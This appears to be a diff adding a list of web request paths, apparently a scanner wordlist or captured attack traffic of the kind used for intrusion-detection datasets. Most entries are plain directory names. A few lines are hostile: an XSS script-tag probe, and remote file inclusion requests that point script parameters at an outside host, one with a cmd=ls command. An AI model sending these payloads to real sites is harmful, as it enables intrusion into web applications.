@@ -1,0 +1,20 @@
+/ingree/
+/telecomm/
+/comp_news/
+/cocacola/
+/examples/jsp/checkbox/error.php?selected_theme=<script>alert(uebimiau_selected_theme_xss.nasl)</script>
+/20050706/
+/serielimitee/
+/181345/
+/1210598223/
+/000023136/
+/image icon converter v1/
+/1163871338580/
+/xml-xindice/
+/bannerper/
+/admin/news.admin.php?path_to_script=http://192.168.202.118:8080/tzhfyzkbomspvm??&cmd=ls
+/w3c-translators/
+/index.php?txt=http://192.168.202.118:8080/ghl9il?
+/dprframeweb/
+/download-001005405/
+/javascript/fb.pfx
